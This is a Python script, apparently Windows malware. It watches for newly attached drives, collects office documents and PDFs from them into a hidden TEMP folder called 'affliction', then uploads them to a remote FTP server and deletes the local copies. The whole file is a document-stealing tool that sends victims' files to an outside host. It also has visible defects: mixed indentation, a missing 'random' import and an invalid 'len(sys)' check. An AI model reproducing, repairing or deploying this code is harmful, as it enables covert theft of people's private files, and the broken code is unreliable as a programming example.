import os
import sys
import time
import hashlib
import fnmatch
import subprocess


from ftplib import FTP

getDisk = lambda: " ".join(subprocess.check_output("wmic logicaldisk get name".split(' ')).decode("utf-8").split(' ')[2:]).replace('\n', '').replace('\r', '').replace (' ', '').split(':')[:-1]

def checkNewDisk():
	begin = getDisk()

	while getDisk() == begin:
		time.sleep(0.1)

	return [disk for disk in getDisk() if disk not in begin]

def findDocument(drive):
	result = []
	for root, _, filenames in os.walk("%s:\\" % (drive)):
		for filename in fnmatch.filter(filenames, "*.odt") + fnmatch.filter(filenames, "*.doc") + fnmatch.filter(filenames, "*.docx") + fnmatch.filter(filenames, "*.xls") + fnmatch.filter(filenames, "*.xlsx") + fnmatch.filter(filenames, "*.pdf"):
			result.append(os.path.join(root, filename))
	return result

def copyToHDD(tocopy):
	if not os.path.isdir("%s\\affliction" % (os.environ["TEMP"])):
		os.mkdir("%s\\affliction" % (os.environ["TEMP"]))
		os.system("attrib +h %s\\affliction" % (os.environ["TEMP"]))
	
	for files in tocopy:
		os.system("copy \"%s\" \"%s\\affliction\\\" > NUL" % (files, os.environ["TEMP"]))

def afflictionEmpty():
	if os.path.isdir("%s\\affliction" % (os.environ["TEMP"])):
		listdir = os.listdir("%s\\affliction" % (os.environ["TEMP"]))
		return [file for file in listdir if os.path.isfile("%s\\affliction\\%s" % (os.environ["TEMP"], file))]
	else:
		return False

# ~ Copier d'internet

def getFtpMd5(ftp, remote_path):
    m = hashlib.md5()
    ftp.retrbinary('RETR %s' % remote_path, m.update)
    return m.hexdigest()

def md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()   

# ~

def HDDToFTP():
    HOST = ""
    USERNAME = ""
    PASSWORD = ""
	ftp = FTP(HOST, USERNAME, PASSWORD)
	files = ftp.nlst("htdocs/OpenLetter")[2:]
	ftp.cwd("htdocs/OpenLetter")
	os.chdir("%s\\affliction" % (os.environ["TEMP"]))
	onHDD = os.listdir()
	
	for file in onHDD:
		toCopy  = True 
		if file in files:
			if md5(file) != getFtpMd5(ftp, file):
				os.rename(file, "%s%d.%s" % ('.'.join(file.split('.')[0:-1]), random.randint(0,999), file.split('.')[-1]))
			else:
				toCopy = False
		if toCopy:
			fichier = open(file, 'rb')
			ftp.storbinary("STOR %s" % (file), fichier, 1024)
			fichier.close()
		os.remove(file)
	ftp.quit()


if __name__ == "__main__":
	if len(sys) == 1:
		exit()
		
	while True:
		newDisk = checkNewDisk()
		directory = afflictionEmpty()
		if directory:
			HDDToFTP()
		for letter in newDisk:
			copyToHDD(findDocument(letter))
	
		HDDToFTP()

	
